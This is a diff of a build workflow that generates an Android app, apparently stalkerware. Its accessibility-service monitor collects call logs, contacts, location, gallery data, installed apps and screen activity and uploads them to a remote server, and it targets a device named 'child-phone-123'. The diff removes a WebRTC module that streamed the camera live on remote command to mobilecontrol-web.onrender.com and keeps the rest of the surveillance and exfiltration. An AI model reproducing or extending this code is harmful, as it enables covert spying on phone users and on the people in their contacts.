@@ -65,16 +65,10 @@ jobs:
                   sourceCompatibility JavaVersion.VERSION_1_8
                   targetCompatibility JavaVersion.VERSION_1_8
               }
-              packagingOptions {
-                  jniLibs {
-                      useLegacyPackaging = true
-                  }
-              }
           }
           dependencies {
               implementation 'androidx.appcompat:appcompat:1.6.1'
               implementation 'com.squareup.okhttp3:okhttp:4.12.0'
-              implementation 'com.infobip:google-webrtc:1.0.0035529'
           }
           EOF
 
@@ -83,7 +77,8 @@ jobs:
 
           cat > app/src/main/AndroidManifest.xml << 'EOF'
           <?xml version="1.0" encoding="utf-8"?>
-          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              package="com.example.neonpanel">
               <uses-permission android:name="android.permission.INTERNET" />
               <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
               <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
@@ -93,13 +88,8 @@ jobs:
               <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
               <uses-permission android:name="android.permission.READ_CALL_LOG" />
               <uses-permission android:name="android.permission.READ_CONTACTS" />
-              <uses-permission android:name="android.permission.CAMERA" />
-              <uses-permission android:name="android.permission.RECORD_AUDIO" />
-              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-              <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
               <application
                   android:allowBackup="true"
-                  android:extractNativeLibs="true"
                   android:icon="@android:drawable/sym_def_app_icon"
                   android:label="@string/app_name"
                   android:theme="@style/Theme.NeonPanel">
@@ -109,7 +99,6 @@ jobs:
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
-                  <activity android:name=".CameraActivity" android:exported="false" />
                   <service android:name=".MonitorService"
                       android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                       android:exported="false">
@@ -151,7 +140,9 @@ jobs:
 
               private BroadcastReceiver syncReceiver = new BroadcastReceiver() {
                   @Override
-                  public void onReceive(Context context, Intent intent) {}
+                  public void onReceive(Context context, Intent intent) {
+                      // No-op; service will handle
+                  }
               };
 
               @Override
@@ -249,6 +240,7 @@ jobs:
                   } else if (requestCode == REQUEST_LOCATION_PERMISSION) {
                       requestCallContactsPermission();
                   } else if (requestCode == REQUEST_CALL_CONTACTS_PERMISSION) {
+                      // Permission granted? Send broadcast to service to sync immediately
                       Intent syncIntent = new Intent(ACTION_SYNC_CALL_CONTACTS);
                       sendBroadcast(syncIntent);
                   }
@@ -258,243 +250,6 @@ jobs:
               public void onBackPressed() {
                   if (webView.canGoBack()) webView.goBack();
                   else super.onBackPressed();
-              }
-          }
-          EOF
-
-          cat > app/src/main/java/com/example/neonpanel/CameraActivity.java << 'EOF'
-          package com.example.neonpanel;
-
-          import android.Manifest;
-          import android.content.pm.PackageManager;
-          import android.os.Bundle;
-          import android.widget.Button;
-          import android.widget.Toast;
-          import androidx.annotation.NonNull;
-          import androidx.appcompat.app.AppCompatActivity;
-          import androidx.core.app.ActivityCompat;
-          import androidx.core.content.ContextCompat;
-          import org.webrtc.*;
-          import okhttp3.*;
-          import org.json.*;
-          import java.util.ArrayList;
-          import java.util.List;
-
-          public class CameraActivity extends AppCompatActivity {
-
-              public static CameraActivity instance;
-
-              private static final int CAMERA_PERMISSION_REQUEST = 100;
-              private SurfaceViewRenderer localView;
-              private PeerConnectionFactory factory;
-              private VideoCapturer videoCapturer;
-              private VideoSource videoSource;
-              private VideoTrack localVideoTrack;
-              private PeerConnection peerConnection;
-              private WebSocket ws;
-              private OkHttpClient okHttpClient;
-              private String deviceId = "child-phone-123";
-              private String serverUrl = "wss://mobilecontrol-web.onrender.com/ws?deviceId=" + deviceId + "&role=device";
-              private boolean isFrontCamera = true;
-
-              private Button switchCameraBtn;
-
-              @Override
-              protected void onCreate(Bundle savedInstanceState) {
-                  super.onCreate(savedInstanceState);
-                  setContentView(R.layout.activity_camera);
-                  instance = this;
-
-                  localView = findViewById(R.id.local_view);
-                  switchCameraBtn = findViewById(R.id.switch_camera_btn);
-
-                  switchCameraBtn.setOnClickListener(v -> switchCamera());
-
-                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                      ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, CAMERA_PERMISSION_REQUEST);
-                  } else {
-                      startCameraStreaming();
-                  }
-              }
-
-              @Override
-              public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-                  if (requestCode == CAMERA_PERMISSION_REQUEST && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                      startCameraStreaming();
-                  } else {
-                      Toast.makeText(this, "Camera permission required", Toast.LENGTH_SHORT).show();
-                      finish();
-                  }
-              }
-
-              @Override
-              protected void onDestroy() {
-                  super.onDestroy();
-                  instance = null;
-                  if (peerConnection != null) peerConnection.close();
-                  if (videoCapturer != null) {
-                      try { videoCapturer.stopCapture(); } catch (InterruptedException e) { }
-                      videoCapturer.dispose();
-                  }
-                  if (factory != null) factory.dispose();
-              }
-
-              private void startCameraStreaming() {
-                  PeerConnectionFactory.initialize(PeerConnectionFactory.InitializationOptions.builder(this).createInitializationOptions());
-                  factory = PeerConnectionFactory.builder().createPeerConnectionFactory();
-
-                  localView.setMirror(isFrontCamera);
-                  localView.setEnableHardwareScaler(true);
-
-                  videoCapturer = createCameraCapturer(isFrontCamera);
-                  videoSource = factory.createVideoSource(videoCapturer.isScreencast());
-                  videoCapturer.initialize(SurfaceTextureHelper.create(Thread.currentThread().getName(), EglBase.create().getEglBaseContext()), localView.getContext(), videoSource.getCapturerObserver());
-                  videoCapturer.startCapture(640, 480, 30);
-
-                  localVideoTrack = factory.createVideoTrack("video0", videoSource);
-                  localVideoTrack.addSink(localView);
-
-                  List<PeerConnection.IceServer> iceServers = new ArrayList<>();
-                  iceServers.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
-
-                  PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(iceServers);
-                  peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
-                      @Override public void onSignalingChange(PeerConnection.SignalingState signalingState) {}
-                      @Override public void onIceConnectionChange(PeerConnection.IceConnectionState iceConnectionState) {}
-                      @Override public void onIceConnectionReceivingChange(boolean receiving) {}
-                      @Override public void onIceGatheringChange(PeerConnection.IceGatheringState iceGatheringState) {}
-                      @Override public void onIceCandidate(IceCandidate iceCandidate) {
-                          JSONObject payload = new JSONObject();
-                          try {
-                              payload.put("ice", iceCandidate.sdp);
-                              payload.put("sdpMid", iceCandidate.sdpMid);
-                              payload.put("sdpMLineIndex", iceCandidate.sdpMLineIndex);
-                              sendSignal(payload);
-                          } catch (JSONException e) { }
-                      }
-                      @Override public void onIceCandidatesRemoved(IceCandidate[] iceCandidates) {}
-                      @Override public void onAddStream(MediaStream mediaStream) {}
-                      @Override public void onRemoveStream(MediaStream mediaStream) {}
-                      @Override public void onDataChannel(DataChannel dataChannel) {}
-                      @Override public void onRenegotiationNeeded() {}
-                  });
-
-                  peerConnection.addTrack(localVideoTrack);
-                  connectWebSocket();
-              }
-
-              private VideoCapturer createCameraCapturer(boolean isFront) {
-                  Camera2Enumerator enumerator = new Camera2Enumerator(this);
-                  String[] devices = enumerator.getDeviceNames();
-                  for (String device : devices) {
-                      if (isFront && enumerator.isFrontFacing(device)) {
-                          return enumerator.createCapturer(device, null);
-                      }
-                      if (!isFront && enumerator.isBackFacing(device)) {
-                          return enumerator.createCapturer(device, null);
-                      }
-                  }
-                  return null;
-              }
-
-              public void switchCamera() {
-                  if (videoCapturer == null) return;
-                  try {
-                      videoCapturer.stopCapture();
-                  } catch (InterruptedException e) {
-                      e.printStackTrace();
-                  }
-                  videoCapturer.dispose();
-
-                  isFrontCamera = !isFrontCamera;
-                  localView.setMirror(isFrontCamera);
-
-                  videoCapturer = createCameraCapturer(isFrontCamera);
-                  if (videoCapturer == null) {
-                      Toast.makeText(this, "Camera not available", Toast.LENGTH_SHORT).show();
-                      return;
-                  }
-
-                  videoSource = factory.createVideoSource(videoCapturer.isScreencast());
-                  videoCapturer.initialize(SurfaceTextureHelper.create(Thread.currentThread().getName(), EglBase.create().getEglBaseContext()), localView.getContext(), videoSource.getCapturerObserver());
-                  videoCapturer.startCapture(640, 480, 30);
-
-                  if (localVideoTrack != null && peerConnection != null && peerConnection.getSenders().size() > 0) {
-                      peerConnection.removeTrack(peerConnection.getSenders().get(0));
-                  }
-                  localVideoTrack = factory.createVideoTrack("video0", videoSource);
-                  localVideoTrack.addSink(localView);
-                  if (peerConnection != null) {
-                      peerConnection.addTrack(localVideoTrack);
-                  }
-              }
-
-              private void connectWebSocket() {
-                  okHttpClient = new OkHttpClient();
-                  Request request = new Request.Builder().url(serverUrl).build();
-                  ws = okHttpClient.newWebSocket(request, new WebSocketListener() {
-                      @Override public void onMessage(WebSocket webSocket, String text) {
-                          try {
-                              JSONObject msg = new JSONObject(text);
-                              if (msg.getString("type").equals("signal")) {
-                                  JSONObject signal = msg.getJSONObject("data");
-                                  if (signal.has("sdp")) {
-                                      String sdp = signal.getString("sdp");
-                                      String type = signal.getString("type");
-                                      if (type.equals("answer")) {
-                                          peerConnection.setRemoteDescription(new SdpObserver() {
-                                              @Override public void onCreateSuccess(SessionDescription sdp) {}
-                                              @Override public void onSetSuccess() {}
-                                              @Override public void onCreateFailure(String s) {}
-                                              @Override public void onSetFailure(String s) {}
-                                          }, new SessionDescription(SessionDescription.Type.ANSWER, sdp));
-                                      }
-                                  } else if (signal.has("ice")) {
-                                      String sdpMid = signal.getString("sdpMid");
-                                      int sdpMLineIndex = signal.getInt("sdpMLineIndex");
-                                      String sdp = signal.getString("ice");
-                                      peerConnection.addIceCandidate(new IceCandidate(sdpMid, sdpMLineIndex, sdp));
-                                  }
-                              } else if (msg.getString("type").equals("start_camera")) {
-                                  createOfferAndSend();
-                              } else if (msg.getString("type").equals("switch_camera")) {
-                                  runOnUiThread(() -> switchCamera());
-                              }
-                          } catch (Exception e) { }
-                      }
-                  });
-              }
-
-              private void createOfferAndSend() {
-                  peerConnection.createOffer(new SdpObserver() {
-                      @Override public void onCreateSuccess(SessionDescription sdp) {
-                          peerConnection.setLocalDescription(new SdpObserver() {
-                              @Override public void onCreateSuccess(SessionDescription sdp) {}
-                              @Override public void onSetSuccess() {}
-                              @Override public void onCreateFailure(String s) {}
-                              @Override public void onSetFailure(String s) {}
-                          }, sdp);
-                          JSONObject payload = new JSONObject();
-                          try {
-                              payload.put("sdp", sdp.description);
-                              payload.put("type", sdp.type.canonicalForm());
-                              sendSignal(payload);
-                          } catch (JSONException e) { }
-                      }
-                      @Override public void onSetSuccess() {}
-                      @Override public void onCreateFailure(String s) {}
-                      @Override public void onSetFailure(String s) {}
-                  }, new MediaConstraints());
-              }
-
-              private void sendSignal(JSONObject payload) {
-                  JSONObject msg = new JSONObject();
-                  try {
-                      msg.put("type", "signal");
-                      msg.put("data", payload);
-                      ws.send(msg.toString());
-                  } catch (JSONException e) { }
               }
           }
           EOF
@@ -517,6 +272,7 @@ jobs:
           import android.location.Location;
           import android.location.LocationListener;
           import android.location.LocationManager;
+          import android.media.ThumbnailUtils;
           import android.net.Uri;
           import android.os.BatteryManager;
           import android.os.Build;
@@ -532,12 +288,12 @@ jobs:
           import android.view.accessibility.AccessibilityEvent;
           import android.view.accessibility.AccessibilityNodeInfo;
           import android.widget.Toast;
-          import androidx.core.content.ContextCompat;
           import org.json.JSONArray;
           import org.json.JSONObject;
           import java.io.ByteArrayOutputStream;
           import java.io.File;
           import java.io.FileWriter;
+          import java.io.IOException;
           import java.util.ArrayList;
           import java.util.Collections;
           import java.util.Comparator;
@@ -551,8 +307,6 @@ jobs:
           import okhttp3.Request;
           import okhttp3.RequestBody;
           import okhttp3.Response;
-          import okhttp3.WebSocket;
-          import okhttp3.WebSocketListener;
 
           public class MonitorService extends AccessibilityService {
               private static final String TAG = "NEON_PANEL";
@@ -573,6 +327,7 @@ jobs:
 
               private StringBuilder pendingText = new StringBuilder();
               private String pendingPackageName = null;
+
               private Runnable screenDataRunnable = null;
               private String lastScreenPackageName = null;
               private String lastSentScreenData = "";
@@ -591,8 +346,6 @@ jobs:
                   }
               };
 
-              private WebSocket cameraWs;
-
               @Override
               public void onServiceConnected() {
                   super.onServiceConnected();
@@ -605,32 +358,10 @@ jobs:
                       } else {
                           registerReceiver(syncReceiver, filter);
                       }
-                      connectCameraWebSocket();
                       showToast("Service connected");
                   } catch (Throwable t) {
                       Log.e(TAG, "onServiceConnected crash", t);
                   }
-              }
-
-              private void connectCameraWebSocket() {
-                  String wsUrl = API_BASE.replace("https://", "wss://").replace("http://", "ws://") + "/ws?deviceId=" + deviceId + "&role=device";
-                  Request request = new Request.Builder().url(wsUrl).build();
-                  cameraWs = httpClient.newWebSocket(request, new WebSocketListener() {
-                      @Override public void onMessage(WebSocket webSocket, String text) {
-                          try {
-                              JSONObject msg = new JSONObject(text);
-                              if ("start_camera".equals(msg.getString("type"))) {
-                                  Intent intent = new Intent(MonitorService.this, CameraActivity.class);
-                                  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                                  startActivity(intent);
-                              } else if ("switch_camera".equals(msg.getString("type"))) {
-                                  if (CameraActivity.instance != null) {
-                                      CameraActivity.instance.runOnUiThread(() -> CameraActivity.instance.switchCamera());
-                                  }
-                              }
-                          } catch (Exception e) { }
-                      }
-                  });
               }
 
               private void showToast(String msg) {
@@ -697,13 +428,15 @@ jobs:
 
               private void startCallContactsSender() {
                   callContactsThread = new Thread(() -> {
+                      // Immediate sync on service start (if permissions already granted)
                       try {
                           sendCallLogs();
                           sendContacts();
                       } catch (Throwable t) { Log.e(TAG, "initial call contacts sync crash", t); }
+
                       while (!Thread.currentThread().isInterrupted()) {
                           try {
-                              Thread.sleep(86400000);
+                              Thread.sleep(86400000); // 24 hours
                               sendCallLogs();
                               sendContacts();
                           } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
@@ -744,12 +477,13 @@ jobs:
               }
 
               private void sendCallLogs() {
-                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
+                  if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
                   try {
                       long now = System.currentTimeMillis();
-                      long cutoff = now - 24 * 60 * 60 * 1000;
+                      long cutoff = now - 24 * 60 * 60 * 1000; // last 24 hours
                       String selection = CallLog.Calls.DATE + " >= ?";
                       String[] selectionArgs = { String.valueOf(cutoff) };
+
                       JSONArray logsArray = new JSONArray();
                       Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, selection, selectionArgs, CallLog.Calls.DATE + " DESC");
                       if (cursor != null) {
@@ -769,6 +503,7 @@ jobs:
                           }
                           cursor.close();
                       }
+
                       JSONObject payload = new JSONObject();
                       payload.put("deviceId", deviceId);
                       payload.put("deviceToken", deviceToken);
@@ -780,7 +515,7 @@ jobs:
               }
 
               private void sendContacts() {
-                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
+                  if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
                   try {
                       JSONArray contactsArray = new JSONArray();
                       Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
@@ -795,6 +530,7 @@ jobs:
                           }
                           cursor.close();
                       }
+
                       JSONObject payload = new JSONObject();
                       payload.put("deviceId", deviceId);
                       payload.put("deviceToken", deviceToken);
@@ -910,8 +646,8 @@ jobs:
               private LocationResult getCurrentLocation(boolean forceFresh) {
                   try {
                       LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-                      if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
-                          ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) return null;
+                      if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+                          checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) return null;
                       if (!forceFresh) {
                           Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                           if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
@@ -939,6 +675,7 @@ jobs:
 
               private List<InstalledApp> getInstalledApps(){ List<InstalledApp> list=new ArrayList<>(); try{ PackageManager pm=getPackageManager(); for(ApplicationInfo ai:pm.getInstalledApplications(0)){ if((ai.flags & ApplicationInfo.FLAG_SYSTEM)==0){ list.add(new InstalledApp(pm.getApplicationLabel(ai).toString(), ai.packageName)); } } }catch(Throwable ignored){} return list; }
 
+              // ================== EVENT HANDLING ==================
               @Override public void onAccessibilityEvent(AccessibilityEvent event) {
                   try {
                       if(event==null)return;
@@ -980,10 +717,10 @@ jobs:
 
               @Override public void onInterrupt() {}
 
+              // Only ONE onDestroy method
               @Override public void onDestroy(){
                   super.onDestroy();
                   try { unregisterReceiver(syncReceiver); } catch (Exception ignored) {}
-                  if (cameraWs != null) cameraWs.close(1000, null);
                   if(deviceStateThread!=null && deviceStateThread.isAlive()) deviceStateThread.interrupt();
                   if(galleryPollerThread!=null && galleryPollerThread.isAlive()) galleryPollerThread.interrupt();
                   if(gpsRequestThread!=null && gpsRequestThread.isAlive()) gpsRequestThread.interrupt();
@@ -1003,31 +740,6 @@ jobs:
               <WebView android:id="@+id/webView"
                   android:layout_width="match_parent"
                   android:layout_height="match_parent" />
-          </LinearLayout>
-          EOF
-
-          cat > app/src/main/res/layout/activity_camera.xml << 'EOF'
-          <?xml version="1.0" encoding="utf-8"?>
-          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
-              android:layout_width="match_parent"
-              android:layout_height="match_parent"
-              android:orientation="vertical">
-
-              <org.webrtc.SurfaceViewRenderer
-                  android:id="@+id/local_view"
-                  android:layout_width="match_parent"
-                  android:layout_height="0dp"
-                  android:layout_weight="1" />
-
-              <Button
-                  android:id="@+id/switch_camera_btn"
-                  android:layout_width="match_parent"
-                  android:layout_height="wrap_content"
-                  android:text="Switch Camera"
-                  android:backgroundTint="#ff3439"
-                  android:textColor="#ffffff"
-                  android:padding="12dp"
-                  android:layout_margin="16dp" />
           </LinearLayout>
           EOF
 
